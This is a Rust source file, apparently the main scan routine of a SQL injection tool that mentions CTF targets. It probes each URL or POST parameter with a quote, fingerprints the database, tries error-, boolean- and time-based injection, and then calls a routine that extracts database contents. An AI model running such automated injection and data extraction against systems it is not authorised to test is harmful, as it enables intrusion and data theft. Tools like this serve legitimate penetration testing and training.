use std::collections::HashMap;

use crate::cli::{Args, Method};
use crate::detection::fingerprint;
use crate::extractor;
use crate::http::{parse_params, HttpClient};
use crate::injections::boolean_based::BooleanBased;
use crate::injections::error_based::ErrorBased;
use crate::injections::time_based::TimeBased;
use crate::injections::Injection;
use crate::models::{DbEngine, InjectionPoint, InjectionType, ParamResult, ScanResult};

pub fn scan(client: &HttpClient, args: &Args) -> ScanResult {
    let url = &args.url;
    let method = &args.method;

    // Collect parameters: POST data arg takes priority, then URL query string
    let params: HashMap<String, String> = if method == &Method::POST {
        if let Some(data) = &args.data {
            parse_params(data)
        } else {
            // Fall back to query string even for POST (common in CTF targets)
            parse_query_string(url)
        }
    } else {
        parse_query_string(url)
    };

    if params.is_empty() {
        eprintln!("[!] No parameters found in URL. Provide params in query string (GET) or via -d (POST).");
        return ScanResult {
            url: url.clone(),
            method: method.to_string(),
            vulnerable_params: vec![],
        };
    }

    println!("[*] Target: {}", url);
    println!("[*] Method: {}", method);
    println!("[*] Parameters found: {}", params.keys().cloned().collect::<Vec<_>>().join(", "));

    let strategies: Vec<Box<dyn Injection>> = vec![
        Box::new(ErrorBased),
        Box::new(BooleanBased),
        Box::new(TimeBased),
    ];

    let mut vulnerable_params: Vec<ParamResult> = vec![];

    for param in params.keys() {
        println!("\n[*] Testing parameter: '{}'", param);

        // Fingerprint DB engine from a bare quote injection
        let probe_val = format!("{}'", params.get(param).cloned().unwrap_or_default());
        let db_engine = match client.send(url, method, &params, param, &probe_val) {
            Ok((_, body, _)) => {
                let engine = fingerprint(&body);
                if engine != DbEngine::Unknown {
                    println!("[+] DB engine hint: {:?}", engine);
                }
                engine
            }
            Err(_) => DbEngine::Unknown,
        };

        // Try each injection strategy
        let mut injection_point: Option<InjectionPoint> = None;

        for strategy in &strategies {
            print!("    [~] Trying {} ... ", strategy.name());
            match strategy.detect(client, url, method, &params, param) {
                Some(payload) => {
                    println!("VULNERABLE! Payload: {:?}", payload);
                    let inj_type = match strategy.name() {
                        "error-based" => InjectionType::ErrorBased,
                        "boolean-based" => InjectionType::BooleanBased,
                        _ => InjectionType::TimeBased,
                    };
                    injection_point = Some(InjectionPoint {
                        param: param.clone(),
                        payload,
                        injection_type: inj_type,
                        db_engine: db_engine.clone(),
                    });
                    break;
                }
                None => println!("not vulnerable"),
            }
        }

        if let Some(point) = injection_point {
            println!("\n[+] Confirmed injection on param '{}' via {}", point.param, point.injection_type);
            println!("[*] Starting data extraction...");

            let databases = extractor::extract(client, url, method, &params, &point);

            vulnerable_params.push(ParamResult {
                param: point.param.clone(),
                payload: point.payload.clone(),
                injection_type: point.injection_type.to_string(),
                db_engine: point.db_engine.to_string(),
                databases,
            });
        } else {
            println!("    [-] Parameter '{}' does not appear vulnerable.", param);
        }
    }

    ScanResult {
        url: url.clone(),
        method: method.to_string(),
        vulnerable_params,
    }
}

fn parse_query_string(url: &str) -> HashMap<String, String> {
    if let Ok(parsed) = url::Url::parse(url) {
        parsed
            .query_pairs()
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect()
    } else {
        HashMap::new()
    }
}
